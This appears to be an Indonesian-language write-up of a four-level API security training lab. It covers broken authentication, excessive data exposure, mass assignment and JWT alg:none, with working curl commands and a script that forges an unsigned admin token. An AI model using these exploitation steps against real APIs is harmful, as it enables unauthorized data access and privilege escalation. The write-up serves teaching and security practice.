# API Security Lab - Writeup
## Port: 8062 | Kategori: API Security

Lab ini memiliki 4 level yang menguji berbagai kerentanan API.

## Level 1: Broken Authentication
### Kerentanan
Endpoint /api/admin/users tidak memiliki pengecekan autentikasi. Endpoint ini mengembalikan semua data user termasuk password dan flag.
### Eksploitasi
curl http://target:8062/api/admin/users

## Level 2: Excessive Data Exposure
### Kerentanan
Endpoint /api/profile mengembalikan terlalu banyak data sensitif termasuk password hash, koneksi database, dan API key (flag).
### Eksploitasi
1. Login: curl -X POST http://target:8062/api/login -H "Content-Type: application/json" -d '{"username":"alice","password":"alice123"}'
2. Profile: curl http://target:8062/api/profile -H "Authorization: Bearer TOKEN"
3. Flag ada di debug_info.api_key

## Level 3: Mass Assignment
### Kerentanan
Endpoint PUT /api/profile menggunakan array_merge() tanpa filter.
### Eksploitasi
curl -X PUT http://target:8062/api/profile -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"role":"admin"}'

## Level 4: JWT alg:none
### Kerentanan
Server menerima JWT dengan algoritma "none".
### Eksploitasi
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"user_id":1,"username":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
TOKEN="$HEADER.$PAYLOAD."
curl http://target:8062/api/admin/flag -H "Authorization: Bearer $TOKEN"
